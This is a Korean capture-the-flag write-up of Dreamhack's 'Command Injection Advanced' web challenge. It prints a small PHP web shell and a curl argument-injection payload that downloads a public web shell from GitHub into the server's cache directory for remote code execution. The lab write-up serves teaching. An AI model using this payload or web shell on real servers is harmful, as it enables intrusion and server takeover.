---
layout: post
title: "[드림핵][Lv.1] Command Injection Advanced 문제 풀이"
date:   2025-07-16 13:00:00 +0900
categories: [CTF & Writeups]
tags: [wargame, web, command-injection]
---

## 1. 개요 (Overview)

- **플랫폼 (Platform)**: 드림핵
- **문제 이름 (Challenge)**: Command Injection Advanced
- **분야 (Category)**: 웹해킹
- **문제 링크 (URL)**: [드림핵 워게임](https://dreamhack.io/wargame/challenges/413)


## 2. 문제 분석 (Problem Analysis)

```php
# 예시: app.py
// 1. 'url' 파라미터가 있는지 확인합니다.
if(isset($_GET['url'])){
    $url = $_GET['url'];

    // 2. URL이 'http'로 시작하는지 검사합니다.
    if(strpos($url, 'http') !== 0 ){
        die('http only !');
    }else{
        // 3. (취약점!) curl 명령어를 실행하여 URL 내용을 가져옵니다.
        $result = shell_exec('curl '. escapeshellcmd($_GET['url']));

        // 4. URL을 md5로 해시하여 캐시 파일 경로를 만듭니다.
        $cache_file = './cache/'.md5($url);

        // 5. 가져온 내용을 캐시 파일에 저장합니다.
        file_put_contents($cache_file, $result);

        // 6. 캐시 파일 링크와 결과를 화면에 출력합니다.
        echo "<p>cache file: <a href='{$cache_file}'>{$cache_file}</a></p>";
        echo '<pre>'. htmlentities($result) .'</pre>';
        return;
    }
}else{
    // 'url' 파라미터가 없으면 아무것도 하지 않습니다.
}
```

#### 웹 쉘 파일 
```php
    <?php
    // 'cmd' 라는 이름의 GET 파라미터로 받은 명령어를 실행하고 결과를 출력합니다.
    if(isset($_GET['cmd'])){
        system($_GET['cmd']);
    }
?>
```
- 또는 깃허브에 올라와 있는 webshell 이용  하는게 편함
- [깃허브 webshell](https://raw.githubusercontent.com/WhiteWinterWolf/wwwolf-php-webshell/master/webshell.php)

<br>
---

### 1) 문제 해설
- 이 문제는 두가지 주요 취약점이 있다. 특히, 첫 번째 취약점은 서버 제어권을 탈취 당 할 수 있는 만큼 매우 치명적인 결함이다.
 

#### 1-1) 명령어 삽입을 통한 원격 코드 실행(RCE)
- scapeshellcmd() 함수는 ;(세미콜론), (or), &(and) 와 같은 쉘 메타 문자를 이스케이프하여 한 줄의 명령 안에서 새로운 명령어를 실행하지 못다로고 방지하는 역할을 한다.
- 이 함수는 명령어에 전달되는 인자 자체를 조작하는 것을 막지 못한다
- 그래서 **curl 명령어의 옵션을 url 파라미터에 전달함녀 잘못된 동작을 유발할** 수 있다.
- 대표적으로 scapeshellcmd() 함수는 하이픈(-)으로 하는 문자열을 막지 못한다.

**(1). 공격자 시나리오(웹쉘 업로드)**
- 공격자가 자신의 서버에 특정 월셀 코드가 들어간 shell.txt 파일을 준비한다.
- 공격자는 아래와 같은 조작된 url 파라미터를 서버로 전송한다.

```php
https://raw.githubusercontent.com/WhiteWinterWolf/wwwolf-php-webshell/master/webshell.php -o ./cache/exploit.php
```

**가. 페이로드 분석**
- `https://raw.github.../webshell.php`: `curl`이 다운로드할 대상 파일이다.
- 위 파일은 GitHub에 공개된 원격 제어용 웹쉘이다.
- 이 부분은 `http`로 시작하여 `index.php`의 1차 방어 로직(`strpos($url, 'http')`)을 우회 하게 된다.
- `-o ./cache/exploit.php`: `curl`의 **파일 쓰기 옵션**으로, 다운로드한 `webshell.php`의 내용을 서버의 `./cache/` 디렉터리에 `exploit.php`라는 이름으로 저장하도록 한다.

<br>

**나. 공격 실행**
1. 공격자는 브라우저나 curl 도구를 통해 아래와 같이 조작된 URL을 타겟 서버에 요청한다.
~~~ HTTP
http://[타겟 서버 주소]/index.php?url=https://raw.githubusercontent.com/WhiteWinterWolf/wwwolf-php-webshell/master/webshell.php -o ./cache/exploit.php
~~~

2. 요청 받은 index.php 는 내부적으로 다음과 같은 쉘 명령을 실행하게 된다.

~~~shell
curl https://raw.githubusercontent.com/WhiteWinterWolf/wwwolf-php-webshell/master/webshell.php -o ./cache/exploit.php
~~~

3. 명령 실행 결과, Githubdp 있던 웹쉘 파일이 서버의 ./cache/exploit.php 경로에 성공적으로 생성된다.

<br>

**다. 원격 코드 실행(RCE)**
- 웹쉘 업로드가 완료되면, 공격자는 해당 파일에 직접 접근하여 서버 제어권을 획득 할 수 있다.

~~~python
http://[타겟 서버 주소]/cache/exploit.php
~~~

- 이제 이 웹수레을 통해, /flag 명령어를 입력하면 flag 값을 확인 할 수 있다.


